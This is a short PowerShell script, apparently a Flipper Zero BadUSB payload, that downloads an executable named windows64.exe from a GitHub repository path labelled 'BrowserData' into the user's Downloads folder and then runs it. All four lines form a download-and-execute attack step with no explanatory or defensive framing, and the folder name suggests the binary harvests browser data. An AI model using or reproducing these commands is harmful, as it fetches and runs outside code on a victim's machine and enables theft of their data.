powershell $url = "https://raw.githubusercontent.com/MagikarpLv13/flipper-zero/main/badusb/BrowserData/External/windows64.exe"
powershell $destination = [System.IO.Path]::Combine($env:UserProfile, 'Downloads', 'windows64.exe')
powershell Invoke-WebRequest -Uri $url -OutFile $destination
powershell Start-Process -FilePath $destination -Wait